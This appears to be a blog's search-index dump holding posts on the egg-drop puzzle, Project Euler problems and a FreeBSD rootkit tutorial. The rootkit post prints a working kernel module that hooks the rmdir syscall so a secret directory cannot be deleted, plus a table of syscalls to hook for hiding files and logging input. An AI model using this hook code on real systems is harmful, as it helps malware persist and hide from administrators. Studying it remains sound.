floor, we now still have 2 eggs to spare, which would allow us to perform more binary searches through 51-100th floor until we have only 1 egg left. So in short, we can only perform binary search when we have both eggs intact, and linear search when we have only 1 of them left. Pretty straighforward.   More binary search!   Instead of performing 49 linear search plus the initial binary search, scoring a horrific 50 tries at worst circumstance, let’s find out what is the optimal number of tries if the first egg manages to survive every binary search drops.                  Count       Try At       Binary Search Start Value       Binary Search End Value       Number of Search Values                       1       50       51       100       50                 2       75       76       100       25                 3       88       87       100       13                 4       94       93       100       7                 5       97       96       100       4                 6       99       98       100       2           The table above illustrates a typical binary search, we always halve the Number of Search Values and add it to the last Try At to get the next binary search offset.   It is clear that the minimal number of tries to get the answer would be 6, we drop the egg at 99th floor if it manages to survive all previous attempts, the answer is 98 if it breaks, and 100 if it doesn’t.   Now we know the range of tries to find the answer is 6 to 50, it is time to optimize our approach.   Optimization   Every optimization starts with a question, are there room for optimization? Fortunately, answering this question often brings us right to the optimized solution, if there is one.   Let’s assume the optimized maximum number of tries to solve this problew is X. We already know that the worst scenario only happen when first binary search resulted in a broken egg, in that case, we have to linear search from 1 to X-1, totalling X-1-1+1 linear searches and 1 already performed binary search.   This means X is not only the max number of tries, but also the first binary search index, or offset if you will. Let’s illustrate this with a table.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 ???       X+1       ???-1       (???-1)-(X+1)+1 = X-2       2       X-2+2 = X           It is obvious for the first try, since at this point we only care about maximum tries, the scenario would be we drop the first egg at Xth floor, it breaks, we then perform linear search from 1st floor to X-1th floor, resulting (X-1)-1+1 = X-1 linear searches, adding the first binary seach try we performed to it, we get X-1+1 = X tries.   Perfect, it meets our assumption that the maximum tries needed to figure out the answer is X. But at which floor should us perform the second binary search try if the egg survived?   Well, we can’t halve the number of remaining search values like we did previously, that simply breaks our assumption of getting the answer within X tries.   An easier way to understand it is, let’s assume the second binary search offset is ???, the linear start would be X+1 since all previous values are ruled out given the first egg survived, the linear end would be ???-1, then total number of linear searches needed to perform if the egg broke at the secound try would be (???-1)-(X+1)+1, and that value must equal to X-2 since only then would total tries equal to X. Thus,      (???-1)-(X+1)+1 = X-2     ??? = 2X-1    Subsequential offsets can all be calculated similarly.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 2X-1       X+1       (2X-1)-1       (2X-1-1)-(X+1)+1 = X-2       2       X-2+2 = X                 3X-3       (2X-1)+1 = 2X       (3X-3)-1       (3X-3-1)-2X = X-3       3       X-3+3 = X                 …       …       …       …       …       …                                                                     It is now obvious that the second binary search offset is X+(X-1) and the third X+(X-1)+(X-2), which allows us to deduce the last try at should be X+(X-1)+(X-2)+…+[X-(X-2)]+1.                  Try At (Binary Search Offset)       Linear Start       Linear End       Linear Searches       Binary Search Performed       Total Tries                       X       1       X-1       (X-1-1)+1 = X-1       1       X-1+1 = X                 X+(X-1)       X+1       (2X-1)-1       (2X-1-1)-(X+1)+1 = X-2       2       X-2+2 = X                 X+(X-1)+(X-2)       (2X-1)+1 = 2X       (3X-3)-1       (3X-3-1)-2X = X-3       3       X-3+3 = X                 …       …       …       …       …       …                 X+(X-1)+(X-2)+…+[X-(X-2)]+1       N/A       N/A       0       X       X           The last binary search we perform should not require any further linear search, thus resulting in X total binary searches, and consequentially X total tries.   In order to fulfil the assumption that the last offset should require no further linear search, which in other words, means we should cover all floors with the last binary search offset, we can conclude that      X+(X-1)+(X-2)+…+[X-(X-2)]+1 &gt;= 100.     Equally     (X+1)X/2 &gt;= 100     X = 14    Sample Code   #!/usr/bin/python ####Dummy Optimized General Solution for 2 Eggs VS 100th Floor###  import random  total_floor = 100 total_egg = 2 total_try = 14 count_try = 0  max_floor = random.randint(1, 100)  def main():      print '---===2 Eggs VS 100th Floor===---'      print '+Type 'exit' to quit the program!'     start = raw_input('+Start? [Press Enter]')     if start == 'exit':         exit()      last_try_at = 0      while total_egg == 2:         #Which means we can still use binary search until we break one egg.         try_at = last_try_at + total_try - count_try          print '-&gt;[Debug]&lt;!!!-Stage 1-!!!&gt; --&gt; Performing Binary Serach...'         print '-&gt;[Debug]count_try = ', count_try         print '-&gt;[Debug]try_at = ', try_at         print '-&gt;[Debug]last_try_at = ', last_try_at          if drop(try_at):             if try_at == 99:                 #This is the extreme case where the binary search was performed at 99th floor, and                 #it breaks, which means 98 is the answer in this context.                 print '-&gt;[Debug]The asnwer is 98!'                 print '-&gt;[Debug]Total Number of Tries: ', count_try                 exit()             linear_start = last_try_at + 1             linear_end = try_at-1             print '-&gt;[Debug]Egg1 Broke!'             print '-&gt;[Debug]Correct answer is in ', linear_start, 'to', linear_end             print '-&gt;[Debug]&lt;!!!-Stage 2-!!!&gt; --&gt; Performing Linear Search...'             for i in range (linear_start, linear_end+1):                 if drop(i):                     print '-&gt;[Debug]Egg broke at', i                     print '-&gt;[Debug]The answer is', i-1                     print '-&gt;[Debug]Total Number of Tries: ', count_try                     exit()                 else:                     print '-&gt;[Debug]Egg did not break at', i              print '-&gt;[Debug]Egg survived all linear searches.'             print '-&gt;[Debug]The answer is', linear_end             print '-&gt;[Debug]Total Number of Tries: ', count_try              break         else:             if try_at == 99:                 #This is the extreme case where the binary search was performed at 99th floor, and                 #it didn't break, which means 100 is the answer in this context.                 print '-&gt;[Debug]The asnwer is 100!'                 print '-&gt;[Debug]Total Number of Tries: ', count_try                 exit()             last_try_at = try_at             print '-&gt;[Debug]Egg1 did not break at ', try_at             print '-&gt;[Debug]Continue binary search...'             continue          break  def drop(floor):     global total_egg     global count_try      if total_egg &lt;= 0:         print '-&gt;No egg available for testing, program failed!'         exit()     elif floor &gt; max_floor: #Egg is gonna break         total_egg -= 1         print '-&gt;Drop egg at ', floor, 'floor: [Broken!]', total_egg, 'egg left!'         count_try += 1         return 1;     else:         print '-&gt;Drop egg at ', floor, 'floor: [Did not break!]', total_egg, 'egg left!'         count_try += 1         return 0; main()   Run this piece of code, you’ll get the number of total tries at the end of each run. To simulate the one of the worst scenario, simply change max_floor to 13.      EDIT: I find myself extremely lack of mathematical thinking at the time of writing this post. However, it is fun to observe your though process many years ago, plus I did manage to get an answer :-D   ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/the-2-eggs-vs-100-floor-problem/",
        "teaser":null},{
        "title": "FreeBSD Rootkit Design Howtos - 9 - Hook Kernel Process Tracking and rmdir_hook Example",
        "excerpt":"It has been a long time since I posted last note on system hooks and a mkdir_hook example. A lot of things happened during these days and I just didn’t manage to get back and post this one. As a matter of fact, the code for this note has been ready since at least a month ago. I don’t know whether there’s anyone waiting for me to update this series but I must admit that I feel bad to had to pause it for a while. I’m glad that I finally have time again to work on this   Nevertheless, I’m back. Enough talking about my personal issues, and let’s get right back to our topic, the long waiting kernel tracing and rmdir_hook example.   Trace the Kernel Calls   Let’s say you have this great idea you want to implement in your rootkit, it does the most despicable things and is as elusive as the shadow, but you may feel lost when you try to code this awesome idea – what are the system calls I should hook to implement certain functionalities?   Fret not, we can trace the kernel calls to find out what system calls are called when certain actions are performed. For example, what are the system calls involved when the host establishes a new TPC connection?   There are only two simple commands involved here for us to track a kernel behavior, ktrace and kdump.   ktrace requires a parameter to pass which should be an executable action that you want the system to perform. Once the action’s done, a trace output file will be generated. And then we can utilize kdump to view a list of all kernel calls when performing the command we specified earlier. Let’s see an example now.   ZFSTest# cd /tmp ZFSTest# mkdir test_folder ZFSTest# ktrace rmdir test_folder ZFSTest# ls .ICE-unix       .XIM-unix       conftest.osav       ktrace.out      mysql.sock      test .X11-unix       .font-unix      conftest.sav        make_fifo_KyuyJ99a2 rmtest ZFSTest#   What we did was we firstly created a testing folder called test_folder and then removed the folder by using rmdir command and traced the kernel activities while we issued the command. A trace result was generated and saved in the current working folder called ktrace.out.   Please keep in mind that in order for ktrace to successfully and fully get your desired result, the command you issued should complete successfully in the first place. Which means, if we plan to see what happens when we delete a folder, and we don’t specify which folder to delete, then we won’t be able to trace the actual folder-deleting kernel call since it wasn’t triggered at all. For example, we can’t get the information about the folder-deleting kernel call if we issued the following command.   ZFSTest# ktrace rmdir usage: rmdir [-pv] directory ... ZFSTest#   That’s because the rmdir command exits straight away after printing the help information on the screen since it didn’t receive any folder to delete, so that the folder-deleting function was not called, and obviously not in the ktrace.out file.   Let’s now take a look at the output file by issuing kdump command which by default will look for ktrace.out file in current working directory.   ZFSTest# kdump | less   2769 ktrace   RET   ktrace 0   2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)   2769 ktrace   NAMI  \"/sbin/rmdir\"   2769 ktrace   RET   execve -1 errno 2 No such file or directory   2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)   2769 ktrace   NAMI  \"/bin/rmdir\"   2769 ktrace   NAMI  \"/libexec/ld-elf.so.1\"   2769 rmdir    RET   execve 0   2769 rmdir    CALL  mmap(0,0x8000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x1002&lt;MAP_PRIVATE|MAP_ANON&gt;,0xffffffff,0)   2769 rmdir    RET   mmap 34365181952/0x800531000   2769 rmdir    CALL  issetugid   2769 rmdir    RET   issetugid 0  ... ...    2769 rmdir    RET   read 128/0x80   2769 rmdir    CALL  lseek(0x3,0x80,SEEK_SET)   2769 rmdir    RET   lseek 128/0x80   2769 rmdir    CALL  read(0x3,0x800534000,0x42)  ... ...    2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)   2769 rmdir    RET   sigprocmask 0   2769 rmdir    CALL  rmdir(0x7fffffffed5e)   2769 rmdir    NAMI  \"test_folder\"   2769 rmdir    RET   rmdir 0  ... ...    2769 rmdir    CALL  exit(0)   There were many different system calls performed when we deleted the test_folder, but the one that we concern most should be rmdir system call at 2769. If you only want to get a name of the system call of a specific command, like what we want here, you can even filter the result by searching keyword CALL to only concentrate on system calls and their names.   ZFSTest# kdump | grep CALL   2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)   2769 ktrace   CALL  execve(0x7fffffffe590,0x7fffffffeb10,0x7fffffffeb28)   2769 rmdir    CALL  mmap(0,0x8000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x1002&lt;MAP_PRIVATE|MAP_ANON&gt;,0xffffffff,0)   2769 rmdir    CALL  issetugid   2769 rmdir    CALL  open(0x80052ca92,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x1b6)   2769 rmdir    CALL  open(0x80052bba9,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x2f)   2769 rmdir    CALL  read(0x3,0x7fffffffe040,0x80)   2769 rmdir    CALL  lseek(0x3,0x80,SEEK_SET)   2769 rmdir    CALL  read(0x3,0x800534000,0x42)   2769 rmdir    CALL  close(0x3)   2769 rmdir    CALL  access(0x800535000,0&lt;F_OK&gt;)   2769 rmdir    CALL  open(0x800532040,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x63a5e0)   2769 rmdir    CALL  fstat(0x3,0x7fffffffe2c0)   2769 rmdir    CALL  pread(0x3,0x8006395c0,0x1000,0)   2769 rmdir    CALL  mmap(0,0x248000,0&lt;PROT_NONE&gt;,0x21002&lt;MAP_PRIVATE|MAP_ANON|MAP_NOCORE&gt;,0xffffffff,0)   2769 rmdir    CALL  mmap(0x800647000,0x10e000,0x5&lt;PROT_READ|PROT_EXEC&gt;,0x20012&lt;MAP_PRIVATE|MAP_FIXED|MAP_NOCORE&gt;,0x3,0)   2769 rmdir    CALL  mmap(0x800854000,0x1f000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x12&lt;MAP_PRIVATE|MAP_FIXED&gt;,0x3,0x10d000)   2769 rmdir    CALL  mprotect(0x800873000,0x1c000,0x3&lt;PROT_READ|PROT_WRITE&gt;)   2769 rmdir    CALL  close(0x3)   2769 rmdir    CALL  sysarch(0x81,0x7fffffffe3a0)   2769 rmdir    CALL  munmap(0x800538000,0x1000)   2769 rmdir    CALL  mmap(0,0x19000,0x3&lt;PROT_READ|PROT_WRITE&gt;,0x1002&lt;MAP_PRIVATE|MAP_ANON&gt;,0xffffffff,0)   2769 rmdir    CALL  sigprocmask(SIG_BLOCK,0x8006394c0,0x7fffffffe370)   2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)   2769 rmdir    CALL  sigprocmask(SIG_BLOCK,0x8006394c0,0x7fffffffe340)   2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)   2769 rmdir    CALL  rmdir(0x7fffffffed5e)   2769 rmdir    CALL  sigprocmask(SIG_BLOCK,0x8006394c0,0x7fffffffe990)   2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)   2769 rmdir    CALL  sigprocmask(SIG_BLOCK,0x8006394c0,0x7fffffffe940)   2769 rmdir    CALL  sigprocmask(SIG_SETMASK,0x8006394d0,0)   2769 rmdir    CALL  exit(0)   How About Some Invincible Folders, Sir?   As what we can see from above results, the rmdir seems to be the final call which the kernel actually performs the deleting operation. So give our goal is to have non-deletable folders, which obviously, by hooking rmdir system calls, we can make certain folders survive from deletion. It is important for rootkits to not be detected and removed so easily, now let’s jump right into in.   One may argue that the user can delete a folder with many different commands, such as rm -r or what if rm -rf? Will the system call the same for all folder-deleting operations even if they were issued by different command? The answer is yes.   ZFSTest# mkdir test_folder ZFSTest# ktrace rm -rf test_folder/ ZFSTest#   We may get different system call routines, but will surely end up with this:   ... ...   2824 rm       CALL  close(0x3)   2824 rm       CALL  access(0x800537000,0&lt;F_OK&gt;)   2824 rm       CALL  open(0x800534040,0&lt;O_RDONLY&gt;,&lt;unused&gt;0x63c5e0) ... ...   2824 rm       CALL  close(0x4)   2824 rm       CALL  fchdir(0x3)   2824 rm       CALL  rmdir(0x800c10100) ... ...   2824 rm       CALL  exit(0)   As you can see, the system call that actually did the deletion is still rmdir. In fact, most of the kernel calls are simple and reusable, may be used by multiple different userland applications. Here’s a list of command system calls from the book.                  System Call       Possible Purpose of Hooking                       read, readv, pread, preadv       Logging Input                 write, writev, pwrite, pwritev       Logging Output                 open       Hiding File Contents                 unlink       Preventing File Removal                 chdir       Preventing Directory Traversal                 chmod       Preventing File Mode Modification                 chown       Preventing Ownership Change                 kill       Preventing Signal Sending                 ioctl       Manipulating ioctl Request                 execve       Redirecting File Execution                 rename       Preventing File Renaming                 rmdir       Preventing Directory Removal                 stat, lstat       Hiding File Status                 getdirentries       Hiding Files                 truncate       Preventing file Truncating or Extending                 kldload       Preventing Module Loading                 kldunload       Preventing Module Unloading           How Does Kernel Delete Folders   So before we actually starting working on our rmdir hooking code, we need to firstly understand how the original rmdir function works. The source code of rmdir command is available at: /usr/src/bin/rmdir/rmdir.c.      #if 0     #ifndef lint     static char const copyright[] =     \"@(#) Copyright (c) 1992, 1993, 1994n             The Regents of the University of California.  All rights reserved.n\";     #endif /* not lint */      #ifndef lint     static char sccsid[] = \"@(#)rmdir.c     8.3 (Berkeley) 4/2/94\";     #endif /* not lint */     #endif     #include &lt;sys/cdefs.h&gt;     __FBSDID(\"$FreeBSD: head/bin/rmdir/rmdir.c 140851 2005-01-26 06:51:28Z ssouhlal $\");      #include &lt;err.h&gt;     #include &lt;stdio.h&gt;     #include &lt;stdlib.h&gt;     #include &lt;string.h&gt;     #include &lt;unistd.h&gt;      static int rm_path(char *);     static void usage(void);      static int pflag;     static int vflag;      int     main(int argc, char *argv[])     {         int ch, errors;          while ((ch = getopt(argc, argv, \"pv\")) != -1)         switch(ch) {             case 'p':                 pflag = 1;                 break;             case 'v':                 vflag = 1;                 break;             case '?':             default:                 usage();         }         argc -= optind;         argv += optind;          if (argc == 0)             usage();          for (errors = 0; *argv; argv++) {             if (rmdir(*argv) &lt; 0) {                 warn(\"%s\", *argv);                 errors = 1;             } else {                 if (vflag)                 printf(\"%sn\", *argv);                 if (pflag)                 errors |= rm_path(*argv);             }         }         exit(errors);     }       static int     rm_path(char *path)     {             char *p;              p = path + strlen(path);             while (--p &gt; path &amp;&amp; *p == '/')                     ;             *++p = '�';             while ((p = strrchr(path, '/')) != NULL) {                     /* Delete trailing slashes. */                     while (--p &gt;= path &amp;&amp; *p == '/')                             ;                     *++p = '�';                     if (p == path)                             break;                      if (rmdir(path) &lt; 0) {                             warn(\"%s\", path);                             return (1);                     }                     if (vflag)                             printf(\"%sn\", path);             }              return (0);     }      static void     usage(void)     {              (void)fprintf(stderr, \"usage: rmdir [-pv] directory ...n\");             exit(1);     }   The code is simple. It calls rmdir straight away with path specified unless pflag was provided to delete every component in the path specified. So now what we need to do is simply hooking rmdir system call.   The rmdir_hook &amp; Summary   This is pretty much all we need to know about kernel activity tracing. We’ve successfully hunted down the final call which FreeBSD kernel utilizes to delete a folder, looked at it’s source code and understood how it works. Now let’s actually code the hook to prevent our folders from being deleted by rmdir system call.   #include &lt;sys/types.h&gt; #include &lt;sys/param.h&gt; #include &lt;sys/proc.h&gt; #include &lt;sys/module.h&gt; #include &lt;sys/sysent.h&gt; #include &lt;sys/kernel.h&gt; //New #include &lt;sys/systm.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/sysproto.h&gt;  /* The system call's arguments. */ /* Refer to /usr/src/bin/rmdir */ struct rmdir_hook_args {     char *path; };  /* rmdir system call hook */ static int rmdir_hook(struct thread *td, void *syscall_args) {     struct rmdir_hook_args *uap;     uap = (struct rmdir_hook_args *)syscall_args;      char path[255];     size_t done;     int error;      error = copyinstr(uap-&gt;path, path, 255, &amp;done);     if (error!=0)         return(error);      /* print a debug message */     uprintf(\"The directory \"%s\" will be removed!n\", path);      /* Check if the secret dir is to be removed */     char secret[] = \"hailang\";      /*         If path is a directory name.         Plain name without '/'     */     if(!strcmp(path,secret))     {         uprintf(\"[Deleting folder]... FAILEDn\");         return 0; //Exit     }     /*         If path is a path          Including absolute path like /usr/local/etc/[secret]         and ./../tmp/test/[secret]          The deletion will be denied as long as the path contains [secret]         e.g. /usr/local/etc/[secret]/test1/test2 will be denied.     */     else     {         char *pch;         char *path_ptr = path;          /* char *strsep(char **stringp, const char *delim); */         while((pch = strsep (&amp;path_ptr,\"/\")) != NULL)         {                 if(!strcmp(pch,secret))                 {                     uprintf(\"[Deleting folder]... FAILEDn\");                     return 0; //Exit                 }         }     }      int errors = rmdir(td, syscall_args);     return errors; }  /* The sysent for the new system call */ static struct sysent rmdir_hook_sysent = {     1,          /* number of arguments */     rmdir_hook  /* implementing function */ };  /* The offset in sysent[] where the system call is to be allocated. */ static int offset = NO_SYSCALL;  /* The function called at load/unload. */ static int load(struct module *module, int cmd, void *arg) {     int error=0;      switch(cmd) {         case MOD_LOAD:             /* Replace mkdir with mkdir_hook. */             sysent[SYS_rmdir].sy_call = (sy_call_t *)rmdir_hook;             uprintf(\"The rmdir_hook is loaded, you can try to rmdir now.n\");             break;          case MOD_UNLOAD:             /* Change everything back to normal. */             sysent[SYS_rmdir].sy_call = (sy_call_t *)rmdir;             uprintf(\"The rmdir_hook is unloaded, everything is back to normal now.n\");             break;          default:             error = EOPNOTSUPP;             break;     }      return(error); }  SYSCALL_MODULE(rmdir_hook, &amp;offset, &amp;rmdir_hook_sysent, load, NULL);   What I did was basically copy the mkdir_hook sample from last note and changed some minor things such as function names and etc. What really matters is the logic in the implementing function which we firstly copy the path specified by the user from userland to kernel space and then check against a pre-defined secret.   What we are trying to achieve is to prevent any path that has the secret word inside from being deleted by the user. What we need to do is to check the path and see whether the secret word is inside or not. Here comes another problem that we need to think about just for a few minutes.   The Absolute Path and Relative Path   We all know the difference between absolute path and relative path. The troublesome part here is that rmdir accepts both of them, meaning that all following commands are acceptable.   rmdir /usr/local/etc/test_conf rmdir ./../local/etc/test_conf rmdir local/etc/../../local/etc/test_conf   We need to protect our folders from being deleted by using relative path, that’s why another checking was implemented in the sample code above to trim ‘/’ from path to see is there any part in the path that matches the secret.   What the code does after that is simple enough, it triggers original rmdir call if secret was not present in the path and the return the status of the execution so that users will be able to see original error messages as well.   Of course, in a real life rootkit, you probably don’t want to print out debug messages saying the deletion failed, they are just for the purpose of this demonstration.   Save the following makefile in the same directory and compile the code.   FILE: makefile KMOD=   rmdir_hook SRCS=   rmdir_hook.c  .include &lt;bsd.kmod.mk&gt;   ZFSTest# make Warning: Object directory not changed from original /zroot/development/4.Hooks/extra cc -O2 -pipe -fno-strict-aliasing -Werror -D_KERNEL -DKLD_MODULE -nostdinc   -I. -I@ -I@/contrib/altq -finline-limit=8000 --param inline-unit-growth=100 --param large-function-growth=1000 -fno-common  -fno-omit-frame-pointer  -mcmodel=kernel -mno-red-zone  -mfpmath=387 -mno-sse -mno-sse2 -mno-sse3 -mno-mmx -mno-3dnow  -msoft-float -fno-asynchronous-unwind-tables -ffreestanding -fstack-protector -std=iso9899:1999 -fstack-protector -Wall -Wredundant-decls -Wnested-externs -Wstrict-prototypes  -Wmissing-prototypes -Wpointer-arith -Winline -Wcast-qual  -Wundef -Wno-pointer-sign -fformat-extensions -c rmdir_hook.c ld  -d -warn-common -r -d -o rmdir_hook.ko rmdir_hook.o :&gt; export_syms awk -f /sys/conf/kmod_syms.awk rmdir_hook.ko  export_syms | xargs -J% objcopy % rmdir_hook.ko objcopy --strip-debug rmdir_hook.ko ZFSTest#   Testing The Invincibility   ZFSTest# mkdir -p /tmp/1/hailang/2 ZFSTest# mkdir /tmp/1/hailang/3 ZFSTest# kldload ./rmdir_hook.ko The rmdir_hook is loaded, you can try to rmdir now. ZFSTest# rmdir /tmp/1/hailang/ The directory \"/tmp/1/hailang/\" will be removed! [Deleting folder]... FAILED ZFSTest# rmdir /tmp/1/hailang/* The directory \"/tmp/1/hailang/2\" will be removed! [Deleting folder]... FAILED The directory \"/tmp/1/hailang/3\" will be removed! [Deleting folder]... FAILED ZFSTest# rm -rf /tmp/1/hailang/* The directory \"/tmp/1/hailang/2\" will be removed! [Deleting folder]... FAILED The directory \"/tmp/1/hailang/3\" will be removed! [Deleting folder]... FAILED ZFSTest# cd /tmp/1 ZFSTest# rmdir ./../1/hailang/2/ The directory \"./../1/hailang/2/\" will be removed! [Deleting folder]... FAILED ZFSTest#   Looks like it’s working as intended, but much more are needed for it to become a full-fledged rootkit.   Play with the sample code, trace your kernel, write your own descipable hooks and share them if you want. I think I have demonstrated what powerful and fun things we can potentially achieve with kernel hooking. Have fun!  ","categories": [],
        "tags": ["FreeBSD","Rootkit","C++"],
        "url": "http://localhost:4000/freebsd-rootkit-design-howtos-9-hook-kernel-process-tracking-and-rmdir-hook-example/",
        "teaser":null},{
        "title": "Multiples of 3 And 5",
        "excerpt":"So I was extremly bored, to a degree that I started reading new threads on Hacker News and accidentally saw a guy Failed, Failed, and Finally Succeeded at Learning How to Code, the Project Euler he mentioned saved my day.   Interesting stuff, there are like 400-something computational problems on that site, which according to that guy      Has trained tens of thousands of new programmers.    I started right away to the first problem, suppose to be a pretty easy one.      If we list all the natural numbers below 10 that are multiples of 3 or 5, we get 3, 5, 6, and 9. The sum of these multiples is 23. Find the sum of all the multiples of 3 or 5 below 10000.    Turns out it is indeed easy. A loop to find all multiples of 3 or 5 that are below 10000, and add them together, woala!   [$] &lt;git:(master?)&gt; python2 Python 2.7.3 (default, Dec 22 2012, 21:14:12) [GCC 4.7.2] on linux2 Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. &gt;&gt;&gt; print \"The answer is: \" + str(sum([x for x in range(1000) if x % 3 == 0 or x % 5 == 0])) The answer is: 233168 &gt;&gt;&gt;   Say x is the multiple of either 3 or 5, at least 1 of the remainder of x % 3 or x % 5 should be 0. Then all we have to do is to find x in the range of 1 to 1000, put them in a list and sum these numbers.   Here’s an elaborated way to do this   result = 0 for x in range(1, 1000):     if x % 3 == 0 or x % 5 == 0:         result += x print result   That’s all for problem 1, easy, but fun. Hopefully I’ll keep getting bored and go through all questions from Project Euler.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/multiples-of-3-and-5/",
        "teaser":null},{
        "title": "Even Fibonacci Numbers",
        "excerpt":"   Each new term in the Fibonacci sequence is generated by adding the previous two terms. By starting with 1 and 2, the first 10 terms will be: 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, … By considering the terms in the Fibonacci sequence whose values do not exceed four million, find the sum of the even-valued terms.    Alright, jump right into the second question from Project Euler. This one shouldn’t be hard too, just find even numbers in Fibonacci sequence whose values are less than 4e6, then sum to get the answer.   It doesn’t really matter if I generate the Fibnacci sequence beforehand or pick only the even ones and add them on the fly, there’ll only be 34 numbers in the list anyways.   Thanks to Python Docs for the Fibonacci sequence generation code, I got this with a little bit modification.   def genFib(x): result = [] a, b = 0, 1 while a &lt; x:     result.append(a)     a, b = b, a+b return result   And then I can do this   print \"The answer is: \" + str(sum([x for x in genFib(4e6) if x % 2 == 0]))   Or this   result = 0 a, b = 0, 1 while a &lt; 4e6: a, b = b, a+b     if a % 2:         continue     result += a print \"The answer is: \" + str(result)   Anyway, the answer is 4613732.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/even-fibonacci-numbers/",
        "teaser":null},{
        "title": "Largest Prime Factor",
        "excerpt":"   Third question from Project Euler, finding the largest factor of a prime number.    Great, I’ve actually been researching in prime numebrs recently. Got this crazy idea, or a hypotheses few monthes ago, but never had the time to prove it. I spent days trying to figure out better way to generate prime numbers, since my crazy theory involves large primes, I mean, really large ones… Anyway, turns out it’s indeed just a crazy thought, not even worth mentioning.   Get back to the topic. Problem 3 asks to find the lagest prime factors of the number 600851475143. Not a large number to be frank. So I’ll stick simplest factorization algorithm for this particular question.   I guess I’ll write a review on more complex factorization algorithms, those that are used to factor large prime numbers in number theory and cryptograhy. Will get back and put the link here if I ever decide to write it.   def prime_factorization(n):     factors = []     x = 2     while x &lt;= n:         if n % x == 0:             n /= x             factors.append(x)         else:             x += 1     return factors   This is like a brute-force algorithm, put x in the factors list if n is divisible by x, then divide n by x before next iteration. If n cannot be divided by x, then increase the value of x by 1.   Then I can just do this to get the result   print \"The answer is: \" + str(max(prime_factorization(600851475143)))   And the answer is 6857.   Few things to keep in mind           Except for prime numbers, all whole numbers can be broken down into prime factors            There’s no need to check whether x is a prime number, it is guaranteed to be prime       To explain this, take a look at the example below.   &gt;&gt;&gt; prime_factorization(100) [2, 2, 5, 5]   Of course, 100 can be factored into non-prime numbers like 4, 10, 20, 25, 50. But as I have explained in (1), all these non-prime numbers can be divided into prime number factors.      4 = 2 * 2     10 = 2 * 5     20 = 2 * 2 * 5    And so on. The fact that the program starts with smallest prime numbers (2, 3, 5, 7…) prevents non-prime factors.   Lastly, note that it’s x &lt;= n  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/largest-prime-factor/",
        "teaser":null},{
        "title": "Largest Palindrome Product",
        "excerpt":"   A palindromic number reads the same both ways. The largest palindrome made from the product of two 2-digit numbers is 9009 = 91*99.     Find the largest palindrome made from the product of two 3-digit numbers.    4th question from Project Euler. Finiding the largest palindromic number that is a product of two 3-digit numbers.   The game plan is to get all the product of 3-digit numbers, find which ones are palindromic, and then print the largest one.   It is clear that the range of 3-digit number is 100 to 999.   itertools.product is used to generate pairs of 3-digit numbers.   from itertools import product product(xrange(100, 999), repeat=2)   It is a short and clean substitute for nested loops.   product(A, B) #equivalent to ((x, y) for x in A for y in B)  product(A, repeat=2) #equivalent to product(A, A)   For details, refer to Python Docs   Finding if a given number is palindromic can be done by converting it into a string and compare it with its reverse copy.   x = 110011 print str(x) == str(x)[::-1] #True   Now we only need to put the results in a list and print the largest one using max().   from itertools import product results = [ a*b for a,b in product(xrange(100,999), repeat=2) \\             if str(a*b) == str(a*b)[::-1] ] print max(results) #906609   So the answer is 906609.  ","categories": [],
        "tags": ["Algorithm","Python"],
        "url": "http://localhost:4000/largest-palindrome-product/",
        "teaser":null},{
        "title": "Smallest Multiple",
        "excerpt":"   2520 is the smallest number that can be divided by each of the numbers from 1 to 10 without any remainder.     What is the smallest positive number that is evenly divisible by all of the numbers from 1 to 20?    Fifth question from Project Euler.   Given that 2520 is evenly divisible by numbers from 1 to 10, which means it is always true that   2520 % x = 0 (0&lt;x&lt;11)   Now 2520 is called the Least Common Multiple (LCM) of X = [1, 2, ..., 10]   The most straight forward method to find the LCM for 1 to 20 is to use a loop and check on every stepping to see if the next number can be divided by 1 to 20. But this will probably take too long (The answer is more than 100 million)   We can try to reduce the size of the set X to speed up the process. 1 for instance, can be removed from the list since all positive whole numbers are divisible by 1. Furthermore, if a number is divisible by 20, then it should be divisible by 2, 4, 5, and 10. We’ll end up with a list looks like   X = [11,13,14,16,17,18,19,20]   Now since it is always true that   (x1 * x2 * x3 * ... * xn) % x1 = 0   So that if we were to multiply all the numbers in X, we get 3724680960 which is divisible by every number in X. We can say that 3724680960 is a common multiple, but it is unlikely the least common multiple.   The LCM can be calculated by dividing 3724680960 by the Greatest Common Divisor (GCD) of X.   For instance,   Y = [6, 9] #Then we have multiple = 6 * 9 = 54 #And GCD(Y) = 3 #Since 54 = 6 * 9 = 3 * 2 * 3 * 3 #Then LCM(Y) = multiple / GCD(Y) = 3 * 2 * 3 * 3 / 3 = 18   Euclidean Algorithm can be used to calculate GCD of two integers very fast.   def gcd(a, b):     while b:         a, b = b, a % b     return a   For instance, gcd(6, 9) will have                  a       b       result                       6       9                         9       6 (6 % 9)                         6       3 (9 % 6)                         3       0 (6 % 3)       3 (b = 0)           And since we have   GCD(a, b, c) = GCD(a, GCD(b, c)) = GCD(GCD(a, b), c) = GCD(GCD(a, c), b)   We can apply gcd and lcm functions to a list of numbers by using reduce   def _sum(a, b):     return a + b  Y = [6, 9, 11] 